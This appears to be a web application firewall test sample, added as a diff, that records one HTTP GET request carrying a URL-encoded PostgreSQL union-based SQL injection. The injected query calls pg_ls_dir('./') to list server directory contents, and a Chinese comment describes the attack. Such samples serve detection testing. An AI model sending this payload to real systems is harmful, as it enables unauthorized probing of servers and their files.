@@ -1,0 +1,9 @@
+# SQL注入_GET_postgresql _普通注入-06506362
+# 攻击者基于union查询，将"union select pg_ls_dir('./')"语句注入到 SQL 查询参数中，使用函数pg_ls_dir()查询目录下所有的文件。
+GET /?id=1%20union%20select%20pg_ls_dir%28%27.%2F%27%29&bid=hd_tag_m8mv23y2 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23y2
+RM-PRO-Token: 5eb780d54626a1e6e7aad39511b3e1c6
+RM-PRO-Time: 1742808352427
+User-Agent: curl/7.83.1
+
